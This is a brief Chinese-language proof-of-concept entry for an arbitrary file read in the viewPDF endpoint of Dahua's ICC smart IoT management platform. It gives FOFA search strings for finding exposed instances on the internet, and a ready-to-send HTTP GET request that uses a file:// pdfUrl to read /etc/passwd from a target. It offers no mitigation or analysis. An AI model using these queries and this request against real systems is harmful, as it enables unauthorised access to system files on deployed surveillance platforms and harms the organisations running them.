## 大华ICC智能物联综合管理平台viewPDF存在任意文件读取

## fofa
```
body="location.hash.indexOf('/authLogin')" || body="客户端会小于800" || title="智能物联综合管理平台" || body="* 客户端会小于800*" || body="/static/fontshd/font-hd.css"
```

## poc
```
GET /evo-apigw/evo-cirs/material/viewPDF?filename=x.pdf&pdfUrl=file:///etc/passwd HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.1052.75 Safari/537.36
```
